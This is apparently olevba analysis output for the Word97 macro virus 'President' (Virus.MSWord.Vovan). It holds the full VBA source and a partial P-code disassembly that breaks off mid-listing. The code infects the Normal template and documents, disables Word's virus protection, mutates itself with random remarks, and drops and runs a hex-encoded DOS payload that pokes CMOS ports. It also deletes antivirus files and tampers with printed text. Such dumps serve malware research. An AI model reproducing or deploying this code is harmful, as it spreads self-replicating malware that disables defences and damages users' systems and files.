olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Vovan
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Vovan - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO President.bas 
in file: ./Virus.MSWord.Vovan - OLE stream: 'Macros/VBA/President'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'MacroWord97.President by VOVAN
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

'Module name: President (Macro)
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub AutoOpen()
If Application.ShowVisualBasicEditor = True Then Application.ShowVisualBasicEditor = False
On Error GoTo -1: On Error GoTo 1
Putsch
Application.ScreenUpdating = False
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="President", Object:=wdOrganizerObjectProjectItems
1:
On Error GoTo -1: On Error GoTo 2
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="picture", Object:=wdOrganizerObjectProjectItems
2:
ActiveDocument.Save
End Sub
Sub ToolsMacro()
Call Forma
End Sub
Sub FileTemplates()
Call Forma
End Sub
Sub ViewVBcode()
Call Forma
End Sub
Sub Organizer()
Call Forma
End Sub
Sub ToolsRecordMacroStart()
Call Forma
End Sub
Sub ToolsRecordMacroToggle()
Call Forma
End Sub
Sub AutoExec()
With Options
.VirusProtection = False
.AllowFastSave = False
.BackgroundSave = False
.CreateBackup = False
.SavePropertiesPrompt = False
.SaveInterval = 0
.SaveNormalPrompt = False
End With
On Error GoTo -1: On Error GoTo holiday
If Day(Now()) = 27 And Month(Now()) = 5 Then
Beep
MsgBox "Âŕń ďđčâĺňńňâóĺň Âĺëčęčé č óćŕńíűé ŃĎÓŇÍČĘ!!!"
'MISTER VOVAN ITS NUMBER ONE!!!
End If
holiday:
End Sub
Sub AutoExit()
With Options
.VirusProtection = True
End With
Application.Quit
End Sub
Sub FileSave()
If Day(Now()) = Month(Now()) Then
Call Forma
End If
On Error GoTo -1: On Error GoTo Error
ActiveDocument.Save
On Error GoTo -1: On Error GoTo 3
Putsch
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="President", Object:=wdOrganizerObjectProjectItems
3:
On Error GoTo -1: On Error GoTo 4
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="picture", Object:=wdOrganizerObjectProjectItems
4:
ActiveDocument.Save
Error:
End Sub
Sub FileSaveAs()
If Day(Now()) = Month(Now()) Then
Call Forma
End If
On Error GoTo -1: On Error GoTo 5
Putsch
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="President", Object:=wdOrganizerObjectProjectItems
5:
On Error GoTo -1: On Error GoTo 6
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="picture", Object:=wdOrganizerObjectProjectItems
6:
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub Forma()
With Options
.VirusProtection = False
End With
Beep
StatusBar = "President"
Load picture
picture.Show
Set fs = Application.FileSearch
With fs
.LookIn = "C:\WINDOWS\"
.FileName = "OFF.COM"
If .Execute > 0 Then
ChDir "C:\WINDOWS\"
Shell "C:\WINDOWS\OFF.COM", 0
End
Else
Call off
End If
End With
End Sub
Sub FilePrint()
If Dialogs(wdDialogFilePrint).Show = -1 Then
With Options
.CheckSpellingAsYouType = False
.CheckGrammarAsYouType = False
End With
Selection.Find.ClearFormatting
Selection.Find.Replacement.ClearFormatting
With Selection.Find
.Text = "÷ňî "
.Replacement.Text = "řňŕ "
.Forward = True
.Wrap = wdFindContinue
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
.Text = " č "
.Replacement.Text = " č íčęóäŕ ˙ íĺ óéäó "
.Forward = True
.Wrap = wdFindContinue
End With
Selection.Find.Execute Replace:=wdReplaceAll
Selection.EndKey Unit:=wdStory
Selection.TypeParagraph
Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
Selection.TypeText Text:="Ĺëüöčí Á.Í. ďîíčěŕĺř?"
Selection.HomeKey Unit:=wdStory
ActiveDocument.UndoClear
End If
End Sub
Sub FilePrintDefault()
Call FilePrint
End Sub
Sub ToolsOptions()
With Options
.VirusProtection = True
.CheckSpellingAsYouType = True
.CheckGrammarAsYouType = True
End With
If Dialogs(wdDialogToolsOptions).Show Then
End If
With Options
.VirusProtection = False
End With
End Sub
Sub HelpAbout()
Call Forma
End Sub
Sub FileOpen()
WordBasic.DisableAutoMacros
On Error GoTo -1: On Error GoTo 100
Dialogs(wdDialogFileOpen).Show
WordBasic.EnableAutoMacros
Call FileSave
100:
End Sub
Sub Putsch()
On Error Resume Next
Application.ScreenUpdating = False
Set Current = MacroContainer
For Grow = 1 To 5
Number = Current.VBProject.VBComponents("President").CodeModule.ProcCountLines("Putsch", vbext_pk_Proc)
RandomLine = Int(Rnd() * Number + 1)
RemarkLength = Int(Rnd() * 40 + 1)
For Length = 1 To RemarkLength
Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next Length
Current.VBProject.VBComponents("President").CodeModule.InsertLines RandomLine, "rem " & Remark
Remark = ""
Next Grow
End Sub
Sub off()
Open "C:\WINDOWS\OFF.SCR" For Output As #1
Print #1, "N OFF.COM"
Print #1, "E 0100 42 59 20 53 45 52 47 45 59 20 5A 41 42 41 52 59"
Print #1, "E 0110 41 4E 53 4B 59 50 B4 4A BB 00 01 CD 21 0F 82 B6"
Print #1, "E 0120 00 B8 87 16 CD 2F 0B C0 0F 85 AB 00 89 3E 48 01"
Print #1, "E 0130 8C 06 4A 01 0B F6 74 0C 8B DE B4 48 CD 21 0F 82"
Print #1, "E 0140 95 00 8E C0 B8 01 00 9A 00 00 00 00 0F 82 87 00"
Print #1, "E 0150 0F 01 06 00 01 A0 05 01 A2 07 01 C7 06 05 01 F2"
Print #1, "E 0160 00 2B C0 B9 01 00 CD 31 72 6D A3 08 01 8B D8 B8"
Print #1, "E 0170 0C 00 66 BF 00 01 00 00 1E 07 CD 31 1E 07 8E 1E"
Print #1, "E 0180 08 01 66 B9 04 00 00 00 66 BE 08 00 00 00 66 BF"
Print #1, "E 0190 0A 01 00 00 F3 66 A5 06 1F 8C CB B8 0B 00 66 BF"
Print #1, "E 01A0 DC 01 00 00 CD 31 C6 06 E1 01 9A 8E 06 08 01 66"
Print #1, "E 01B0 B9 04 00 00 00 66 BE DC 01 00 00 66 BF 08 00 00"
Print #1, "E 01C0 00 F3 66 A5 9A 00 00 13 00 FA B0 8F E6 70 B0 00"
Print #1, "E 01D0 E6 71 B8 FE 00 E7 64 B8 00 4C CD 21 00 00 00 00"
Print #1, "E 01E0 00 00 00 00 C9 01 0B 00 00 EC 00 00"
Print #1, "RCX"
Print #1, "00EC"
Print #1, "W"
Print #1, "Q"
Close #1
Open "C:\WINDOWS\OFF.BAT" For Output As #1
Print #1, "@echo off"
Print #1, "debug < OFF.SCR"
Close #1
ChDir "C:\WINDOWS\"
Shell "C:\WINDOWS\OFF.BAT", 0
Dim PauseTime, Start, Finish
PauseTime = 10
Start = Timer
Do While Timer < Start + PauseTime
DoEvents
Loop
Finish = Timer
ChDir "C:\WINDOWS\"
Kill "C:\WINDOWS\OFF.BAT"
Kill "C:\WINDOWS\OFF.SCR"
On Error GoTo -1: On Error GoTo AVP
Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
StatusBar = "Äóěŕ îňďđŕâëĺíŕ â îňńňŕâęó!"
AVP:
End
End Sub
'***************************************
'* Author of given MacroVirus is VOVAN *
'*         MacroVirus.Word97           *
'*      Name of President virus        *
'*             Ver 1.0                 *
'***************************************
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Vovan
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/President - 12747 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001E "MacroWord97.President by VOVAN"
' Line #1:
' 	QuoteRem 0x0000 0x001E "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x001E "Module name: President (Macro)"
' Line #4:
' 	QuoteRem 0x0000 0x001D "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
' Line #5:
' 	FuncDefn (Sub AutoOpen())
' Line #6:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	EndIf 
' Line #7:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError 1 
' Line #8:
' 	ArgsCall Putsch 0x0000 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "President"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #11:
' 	LineNum 1 
' 	BoS 0x0000 
' Line #12:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError 2 
' Line #13:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "picture"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #14:
' 	LineNum 2 
' 	BoS 0x0000 
' Line #15:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #16:
' 	EndSub 
' Line #17:
' 	FuncDefn (Sub ToolsMacro())
' Line #18:
' 	ArgsCall (Call) Forma 0x0000 
' Line #19:
' 	EndSub 
' Line #20:
' 	FuncDefn (Sub FileTemplates())
' Line #21:
' 	ArgsCall (Call) Forma 0x0000 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Sub ViewVBcode())
' Line #24:
' 	ArgsCall (Call) Forma 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub Organizer())
' Line #27:
' 	ArgsCall (Call) Forma 0x0000 
' Line #28:
' 	EndSub 
' Line #29:
' 	FuncDefn (Sub ToolsRecordMacroStart())
' Line #30:
' 	ArgsCall (Call) Forma 0x0000 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Sub ToolsRecordMacroToggle())
' Line #33:
' 	ArgsCall (Call) Forma 0x0000 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub AutoExec())
' Line #36:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #37:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #38:
' 	LitVarSpecial (False)
' 	MemStWith AllowFastSave 
' Line #39:
' 	LitVarSpecial (False)
' 	MemStWith BackgroundSave 
' Line #40:
' 	LitVarSpecial (False)
' 	MemStWith CreateBackup 
' Line #41:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #42:
' 	LitDI2 0x0000 
' 	MemStWith SaveInterval 
' Line #43:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #44:
' 	EndWith 
' Line #45:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError holiday 
' Line #46:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001B 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #47:
' 	ArgsCall Beep 0x0000 
' Line #48:
' 	LitStr 0x002D "Âŕń ďđčâĺňńňâóĺň Âĺëčęčé č óćŕńíűé ŃĎÓŇÍČĘ!!!"
' 	ArgsCall MsgBox 0x0001 
' Line #49:
' 	QuoteRem 0x0000 0x001E "MISTER VOVAN ITS NUMBER ONE!!!"
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	Label holiday 
' Line #52:
' 	EndSub 
' Line #53:
' 	FuncDefn (Sub AutoExit())
' Line #54:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #55:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #56:
' 	EndWith 
' Line #57:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #58:
' 	EndSub 
' Line #59:
' 	FuncDefn (Sub FileSave())
' Line #60:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) Forma 0x0000 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Error 
' Line #64:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #65:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError 3 
' Line #66:
' 	ArgsCall Putsch 0x0000 
' Line #67:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #68:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #69:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "President"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #70:
' 	LineNum 3 
' 	BoS 0x0000 
' Line #71:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError 4 
' Line #72:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "picture"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #73:
' 	LineNum 4 
' 	BoS 0x0000 
' Line #74:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #75:
' 	Label Error 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Sub FileSaveAs())
' Line #78:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	IfBlock 
' Line #79:
' 	ArgsCall (Call) Forma 0x0000 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError 5 
' Line #82:
' 	ArgsCall Putsch 0x0000 
' Line #83:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #84:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #85:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "President"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #86:
' 	LineNum 5 
' 	BoS 0x0000 
' Line #87:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError 6 
' Line #88:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "picture"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #89:
' 	LineNum 6 
' 	BoS 0x0000 
' Line #90:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #91:
' 	EndSub 
' Line #92:
' 	FuncDefn (Sub Forma())
' Line #93:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #94:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #95:
' 	EndWith 
' Line #96:
' 	ArgsCall Beep 0x0000 
' Line #97:
' 	LitStr 0x0009 "President"
' 	St StatusBar 
' Line #98:
' 	Ld picture 
' 	ArgsCall Local 0x0001 
' Line #99:
' 	Ld picture 
' 	ArgsMemCall Show 0x0000 
' Line #100:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #101:
' 	StartWithExpr 
' 	Ld fs 
' 	With 
' Line #102:
' 	LitStr 0x000B "C:\WINDOWS\"
' 	MemStWith LookIn 
' Line #103:
' 	LitStr 0x0007 "OFF.COM"
' 	MemStWith FileName 
' Line #104:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #105:
' 	LitStr 0x000B "C:\WINDOWS\"
' 	ArgsCall ChDir 0x0001 
' Line #106:
' 	LitStr 0x0012 "C:\WINDOWS\OFF.COM"
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #107:
' 	End 
' Line #108:
' 	ElseBlock 
' Line #109:
' 	ArgsCall (Call) off 0x0000 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	EndWith 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Sub FilePrint())
' Line #114:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #115:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #116:
' 	LitVarSpecial (False)
' 	MemStWith CheckSpellingAsYouType 
' Line #117:
' 	LitVarSpecial (False)
' 	MemStWith CheckGrammarAsYouType 
' Line #118:
' 	EndWith 
' Line #119:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #120:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #121:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #122:
' 	LitStr 0x0004 "÷ňî "
' 	MemStWith Then 
' Line #123:
' 	LitStr 0x0004 "řňŕ "
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #124:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #125:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #126:
' 	EndWith 
' Line #127:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #128:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #129:
' 	LitStr 0x0003 " č "
' 	MemStWith Then 
' Line #130:
' 	LitStr 0x0014 " č íčęóäŕ ˙ íĺ óéäó "
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #131:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #132:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #133:
' 	EndWith 
' Line #134:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #135:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #136:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #137:
' 	Ld wdAlignParagraphRight 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #138:
' 	LitStr 0x0015 "Ĺëüöčí Á.Í. ďîíčěŕĺř?"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #139:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #140:
' 	Ld ActiveDocument 
' 	ArgsMemCall UndoClear 0x0000 
' Line #141:
' 	EndIfBlock 
' Line #142:
' 	EndSub 
' Line #143:
' 	FuncDefn (Sub FilePrintDefault())
' Line #144:
' 	ArgsCall (Call) FilePrint 0x0000 
' Line #145:
' 	EndSub 
' Line #146:
' 	FuncDefn (Sub ToolsOptions())
' Line #147:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #148:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #149:
' 	LitVarSpecial (True)
' 	MemStWith CheckSpellingAsYouType 
' Line #150:
' 	LitVarSpecial (True)
' 	MemStWith CheckGrammarAsYouType 
' Line #151:
' 	EndWith 
' Line #152:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	IfBlock 
' Line #153:
' 	EndIfBlock 
' Line #154:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #155:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #156:
' 	EndWith 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Sub HelpAbout())
' Line #159:
' 	ArgsCall (Call) Forma 0x0000 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Sub FileOpen())
' Line #162:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #163:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError 100 
' Line #164:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #165:
' 	Ld WordBasic 
' 	ArgsMemCall EnableAutoMacros 0x0000 
' Line #166:
' 	ArgsCall (Call) FileSave 0x0000 
' Line #167:
' 	LineNum 100 
' 	BoS 0x0000 
' Line #168:
' 	EndSub 
' Line #169:
' 	FuncDefn (Sub Putsch())
' Line #170:
' 	OnError (Resume Next) 
' Line #171:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #172:
' 	SetStmt 
' 	Ld MacroContainer 
' 	Set Current 
' Line #173:
' 	StartForVariable 
' 	Ld Grow 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	For 
' Line #174:
' 	LitStr 0x0006 "Putsch"
' 	Ld vbext_pk_Proc 
' 	LitStr 0x0009 "President"
' 	Ld Current 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Number 
' Line #175:
' 	ArgsLd Rnd 0x0000 
' 	Ld Number 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St RandomLine 
' Line #176:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0028 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St RemarkLength 
' Line #177:
' 	StartForVariable 
' 	Ld Length 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld RemarkLength 
' 	For 
' Line #178:
' 	Ld Remark 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Remark 
' Line #179:
' 	StartForVariable 
' 	Ld Length 
' 	EndForVariable 
' 	NextVar 
' Line #180:
' 	Ld RandomLine 
' 	LitStr 0x0004 "rem "
' 	Ld Remark 
' 	Concat 
' 	LitStr 0x0009 "President"
' 	Ld Current 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #181:
' 	LitStr 0x0000 ""
' 	St Remark 
' Line #182:
' 	StartForVariable 
' 	Ld Grow 
' 	EndForVariable 
' 	NextVar 
' Line #183:
' 	EndSub 
' Line #184:
' 	FuncDefn (Sub off())
' Line #185:
' 	LitStr 0x0012 "C:\WINDOWS\OFF.SCR"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #186:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "N OFF.COM"
' 	PrintItemNL 
' Line #187:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0100 42 59 20 53 45 52 47 45 59 20 5A 41 42 41 52 59"
' 	PrintItemNL 
' Line #188:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0110 41 4E 53 4B 59 50 B4 4A BB 00 01 CD 21 0F 82 B6"
' 	PrintItemNL 
' Line #189:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0120 00 B8 87 16 CD 2F 0B C0 0F 85 AB 00 89 3E 48 01"
' 	PrintItemNL 
' Line #190:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0130 8C 06 4A 01 0B F6 74 0C 8B DE B4 48 CD 21 0F 82"
' 	PrintItemNL 
' Line #191:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0140 95 00 8E C0 B8 01 00 9A 00 00 00 00 0F 82 87 00"
' 	PrintItemNL 
' Line #192:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0150 0F 01 06 00 01 A0 05 01 A2 07 01 C7 06 05 01 F2"
' 	PrintItemNL 
' Line #193:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0160 00 2B C0 B9 01 00 CD 31 72 6D A3 08 01 8B D8 B8"
' 	PrintItemNL 
' Line #194:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0170 0C 00 66 BF 00 01 00 00 1E 07 CD 31 1E 07 8E 1E"
' 	PrintItemNL 
' Line #195:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0180 08 01 66 B9 04 00 00 00 66 BE 08 00 00 00 66 BF"
' 	PrintItemNL 
' Line #196:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0190 0A 01 00 00 F3 66 A5 06 1F 8C CB B8 0B 00 66 BF"
' 	PrintItemNL 
' Line #197:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01A0 DC 01 00 00 CD 31 C6 06 E1 01 9A 8E 06 08 01 66"
' 	PrintItemNL 
' Line #198:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01B0 B9 04 00 00 00 66 BE DC 01 00 00 66 BF 08 00 00"
' 	PrintItemNL 
' Line #199:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01C0 00 F3 66 A5 9A 00 00 13 00 FA B0 8F E6 70 B0 00"
' 	PrintItemNL 
' Line #200:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01D0 E6 71 B8 FE 00 E7 64 B8 00 4C CD 21 00 00 00 00"
' 	PrintItemNL 
' Line #201:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "E 01E0 00 00 00 00 C9 01 0B 00 00 EC 00 00"
' 	PrintItemNL 
' Line #202:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "RCX"
' 	PrintItemNL 
' Line #203:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "00EC"
' 	PrintItemNL 
' Line #204:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "W"
' 	PrintItemNL 
' Line #205:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "Q"
' 	PrintItemNL 
' Line #206:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #207:
' 	LitStr 0x0012 "C:\WINDOWS\OFF.BAT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #208:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #209:
